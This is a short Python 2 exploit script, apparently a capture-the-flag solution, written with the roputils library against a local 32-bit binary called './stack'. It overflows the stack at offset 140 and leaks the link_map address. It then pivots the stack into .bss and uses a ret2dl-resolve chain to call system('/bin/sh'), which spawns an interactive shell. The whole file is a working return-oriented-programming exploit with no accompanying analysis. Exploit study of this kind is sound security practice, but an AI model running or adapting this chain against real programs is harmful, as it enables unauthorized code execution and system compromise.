from roputils import *
import time
#fpath = sys.argv[1]
#offset = int(sys.argv[2])

fpath = './stack'
offset = 140

rop = ROP(fpath)
addr_bss = rop.section('.bss') + 0x400
print "Fake structures will be written to " + hex(addr_bss)

pop_ebp_ret = 0x08048bcb
leave_ret   = 0x080485a8

# leak link_map address
buf = rop.retfill(offset)
buf += rop.call('write', 1, 0x8048C5F, 4)
buf += rop.call('write', 1, rop.got()+4, 4)
buf += rop.call('read', 0, addr_bss, 100)
buf += p32(pop_ebp_ret) # adjust stack to .bss section
buf += p32(addr_bss)
buf += p32(leave_ret)
buf += rop.fill(0x100, buf)

p = Proc(rop.fpath)
p.write(buf)

p.read_until('Init')
print "Waitting for leaking link_map address..."

p.read_until('Init')

addr_link_map = p.read_p32() 
print "addr_link_map is " + hex(addr_link_map) 

# Let's go!
print "woop woop woop!"

buf = 'AAAA' # fake ebp
buf += rop.call('read', 0, addr_link_map+0xe4, 4)
buf += rop.dl_resolve_call(addr_bss+60, addr_bss+40)
buf += rop.fill(40, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(60, buf)
buf += rop.dl_resolve_data(addr_bss+60, 'system')
buf += rop.fill(100, buf)

p.write(buf)
p.write_p32(0)

p.interact(0)
